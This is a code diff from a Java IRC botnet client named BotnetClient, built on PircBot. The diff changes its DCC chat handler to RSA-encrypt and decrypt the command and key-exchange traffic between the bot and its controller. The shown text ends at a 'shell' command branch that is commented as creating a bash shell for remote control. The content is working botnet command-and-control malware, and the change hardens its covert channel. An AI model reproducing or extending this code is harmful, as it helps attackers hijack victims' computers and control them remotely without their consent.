@@ -233,24 +233,24 @@ public class BotnetClient extends PircBot {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
 				} else {
 					chat.accept();
-					String s2 = chat.readLine();
-					System.out.println("c:" + s2);
-					System.out.println("m:" + m.decryptRSA(s2));
-					String command = m.decryptRSA(s2);
+					//String s2 = m.decryptRSA(chat.readLine());
+					//System.out.println("c:" + s2);
+					//System.out.println("m:" + m.decryptRSA(s2));
+					String command = m.decryptRSA(chat.readLine());
 					if (command.equalsIgnoreCase("key")) {
 						//Read the key info using char.readLine(); 
-						String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
+						String otherKey = m.decryptRSA(chat.readLine());
 						//s2 = chat.readLine();
 						//String otherKey = m.decryptRSA(s2);
 						//System.out.println("c:" + s2);
 						//System.out.println("m:" + m.decryptRSA(s2));
 						//System.out.println("key: " + otherKey);
-						String info = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
+						String info = m.decryptRSA(chat.readLine());
 						//System.out.println("info: " + info);
 						m.setPubParams(info);
 						m.handShake(otherKey);
 						//chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
-						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
+						chat.sendLine(m.encryptRSA(m.getStrKey()));
 						chat.close();
 					} else if (m.decryptMsg(command).equalsIgnoreCase("shell")) {
 						//Create the bash shell
